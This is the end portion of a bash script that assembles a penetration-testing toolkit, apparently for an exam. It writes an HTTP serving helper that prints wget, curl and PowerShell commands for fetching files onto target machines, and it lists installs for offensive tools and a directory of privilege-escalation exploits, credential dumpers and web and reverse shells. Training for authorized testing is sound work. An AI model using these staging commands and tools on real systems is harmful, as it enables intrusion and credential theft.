echo -e "  ${DIM}[>] Wordlist paths written to wordlists/paths.md${RST}"

# ═══════════════════════════════════════════════════════════════
#  MISC
# ═══════════════════════════════════════════════════════════════
section "Misc"
grab "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" \
    "$TOOLS_DIR/misc/LinEnum.sh" "LinEnum (duplicate in misc for easy find)"

# Write a useful serve.sh helper
cat > "$TOOLS_DIR/serve.sh" << SERVEEOF
#!/bin/bash
# Spin up an HTTP server to serve tools to targets
PORT=\${1:-8000}
IP=\$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
     ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo "YOUR_IP")
echo "[*] Serving \$(pwd) on http://\${IP}:\${PORT}"
echo ""
echo "    # Linux download"
echo "    wget http://\${IP}:\${PORT}/<file>"
echo "    curl http://\${IP}:\${PORT}/<file> -o <file>"
echo ""
echo "    # Windows download (PowerShell)"
echo "    IWR -Uri http://\${IP}:\${PORT}/<file> -OutFile <file>"
echo "    (New-Object Net.WebClient).DownloadFile('http://\${IP}:\${PORT}/<file>','C:\\\\Windows\\\\Temp\\\\<file>')"
echo ""
echo "    # Windows — SMB (impacket)"
echo "    impacket-smbserver share \$(pwd) -smb2support"
echo ""
python3 -m http.server \$PORT
SERVEEOF
chmod +x "$TOOLS_DIR/serve.sh"
echo -e "  ${DIM}[>] serve.sh helper written${RST}"

# Write manifest
echo -e "\n  ${DIM}[*] Writing manifest...${RST}"
find "$TOOLS_DIR" -type f | sort > "$TOOLS_DIR/manifest.txt"
echo "Generated: $(date)" >> "$TOOLS_DIR/manifest.txt"
echo -e "  ${DIM}[>] manifest.txt written${RST}"

# ═══════════════════════════════════════════════════════════════
#  PIP / GEM INSTALL REMINDERS
# ═══════════════════════════════════════════════════════════════
section "Install These Separately (pip / gem / apt)"
echo -e "  ${CYN}# Impacket suite (secretsdump, psexec, getST, GetUserSPNs etc.)${RST}"
echo -e "  pip install impacket --break-system-packages"
echo ""
echo -e "  ${CYN}# AD object manipulation (ACL abuse, password resets)${RST}"
echo -e "  pip install bloodyAD --break-system-packages"
echo ""
echo -e "  ${CYN}# Python BloodHound data collector${RST}"
echo -e "  pip install bloodhound --break-system-packages"
echo ""
echo -e "  ${CYN}# AD certificate services abuse${RST}"
echo -e "  pip install certipy-ad --break-system-packages"
echo ""
echo -e "  ${CYN}# Parse LSASS dumps on Linux (alternative to Mimikatz)${RST}"
echo -e "  pip install pypykatz --break-system-packages"
echo ""
echo -e "  ${CYN}# IPv6 poisoning (use with ntlmrelayx)${RST}"
echo -e "  pip install mitm6 --break-system-packages"
echo ""
echo -e "  ${CYN}# Automated coercion (PrinterBug, PetitPotam, DFSCoerce etc.)${RST}"
echo -e "  pip install coercer --break-system-packages"
echo ""
echo -e "  ${CYN}# Upload server (for receiving files from targets)${RST}"
echo -e "  pip install uploadserver --break-system-packages"
echo ""
echo -e "  ${CYN}# WinRM shell${RST}"
echo -e "  gem install evil-winrm"
echo ""
echo -e "  ${CYN}# Wordlists${RST}"
echo -e "  sudo apt install seclists -y"
echo ""
echo -e "  ${CYN}# Responder${RST}"
echo -e "  sudo apt install responder -y"

# ═══════════════════════════════════════════════════════════════
#  SUMMARY
# ═══════════════════════════════════════════════════════════════
TOTAL=$(find "$TOOLS_DIR" -type f | wc -l)
section "Summary"
echo ""
echo -e "  ${GRN}Downloaded  : ${DOWNLOADED}${RST}"
echo -e "  ${YEL}Skipped     : ${SKIPPED}${RST}  (use --force to re-download)"
echo -e "  ${RED}Failed      : ${FAILED}${RST}"
echo -e "  ${BLD}Total files : ${TOTAL}${RST}"
echo ""
echo -e "  ${BLD}Structure:${RST}"
echo -e "  ${DIM}$TOOLS_DIR/"
echo -e "  ├── linux/           linPEAS, pspy, LES, LinEnum, pwnkit"
echo -e "  ├── windows/"
echo -e "  │   ├── potatoes/    GodPotato, PrintSpoofer, SigmaPotato, JuicyPotato, RoguePotato, SweetPotato"
echo -e "  │   ├── sharp/       SharpUp, Seatbelt"
echo -e "  │   └── privesc/     PowerUp, PrivescCheck, FullPowers"
echo -e "  ├── ad/"
echo -e "  │   ├── Rubeus       Mimikatz, PowerView, SharpHound, RustHound, kerbrute"
echo -e "  │   ├── Snaffler     SessionGopher, LaZagne, SharpDPAPI, InvokeKerberoast"
echo -e "  │   ├── adcs/        Certify, Whisker, PassTheCert"
echo -e "  │   ├── coercion/    PetitPotam, printerbug, krbrelayx"
echo -e "  │   └── lateral/     SharpWMI, SharpRDP, Invoke-TheHash"
echo -e "  ├── post-exploit/    nanodump, pypykatz, ProcDump, LaZagne"
echo -e "  ├── pivoting/        Chisel, Ligolo-ng, socat, static nmap + proxychains configs"
echo -e "  ├── containers/      CDK, deepce, lxd builder"
echo -e "  ├── web/"
echo -e "  │   ├── shells/      php-reverse-shell, p0wny, wwwolf, cmd.php, cmd_obf.php"
echo -e "  │   ├── jsp/         cmd.jsp, reverse.jsp"
echo -e "  │   └── aspx/        cmd.aspx"
echo -e "  ├── web/cmd.war      Tomcat WAR (if JDK installed)"
echo -e "  ├── wordlists/paths.md"
echo -e "  ├── serve.sh         HTTP server helper${RST}"
echo -e "  └── ${DIM}manifest.txt${RST}"
echo ""
echo -e "  ${BLD}Exam day:${RST}"
echo -e "  ${CYN}cd $TOOLS_DIR && ./serve.sh${RST}"
echo ""
